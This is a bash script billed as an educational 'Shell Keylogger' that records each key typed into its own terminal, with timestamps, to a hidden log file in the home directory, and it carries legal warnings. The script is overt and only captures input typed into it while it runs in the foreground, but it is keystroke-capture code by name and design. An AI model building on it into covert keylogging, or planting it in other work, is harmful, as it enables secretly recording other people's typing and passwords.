#!/bin/bash

# WARNING: For educational use only on your own systems
# Unauthorized use is illegal

LOG_FILE="${HOME}/.keylog_$(date +%Y%m%d_%H%M%S).txt"
RUNNING_FILE="/tmp/keylogger.pid"

function banner() {
    echo "==========================================="
    echo "  Shell Keylogger - v1.0"
    echo "  Educational purposes only"
    echo "==========================================="
    echo ""
}

function check_running() {
    if [ -f "$RUNNING_FILE" ]; then
        echo "[ERROR] Keylogger already running"
        echo "PID: $(cat $RUNNING_FILE)"
        exit 1
    fi
}

function start_logging() {
    banner
    check_running
    
    echo $$ > "$RUNNING_FILE"
    echo "[INFO] Starting keylogger..."
    echo "[INFO] Log file: $LOG_FILE"
    echo "[INFO] PID: $$"
    echo "[INFO] Press Ctrl+C to stop"
    echo ""
    echo "[Started at $(date)]" >> "$LOG_FILE"
    
    while true; do
        read -rsn1 key
        timestamp=$(date +"%Y-%m-%d %H:%M:%S")
        
        if [ -z "$key" ]; then
            echo "[$timestamp] <ENTER>" >> "$LOG_FILE"
        elif [ "$key" = $'\x7f' ]; then
            echo "[$timestamp] <BACKSPACE>" >> "$LOG_FILE"
        elif [ "$key" = $'\t' ]; then
            echo "[$timestamp] <TAB>" >> "$LOG_FILE"
        elif [ "$key" = $'\x1b' ]; then
            echo "[$timestamp] <ESC>" >> "$LOG_FILE"
        else
            echo "[$timestamp] $key" >> "$LOG_FILE"
        fi
    done
}

function stop_logging() {
    echo ""
    echo "[INFO] Stopping keylogger..."
    echo "[Stopped at $(date)]" >> "$LOG_FILE"
    rm -f "$RUNNING_FILE"
    echo "[INFO] Log saved: $LOG_FILE"
    exit 0
}

trap stop_logging SIGINT SIGTERM

if [ "$1" = "--help" ] || [ "$1" = "-h" ]; then
    banner
    echo "Usage: $0"
    echo ""
    echo "This script captures keystrokes in the current terminal."
    echo "Logs are saved to: ~/.keylog_YYYYMMDD_HHMMSS.txt"
    echo ""
    echo "LEGAL WARNING:"
    echo "  - Use only on your own systems"
    echo "  - Unauthorized use is illegal"
    echo "  - For educational purposes only"
    echo ""
    exit 0
fi

start_logging
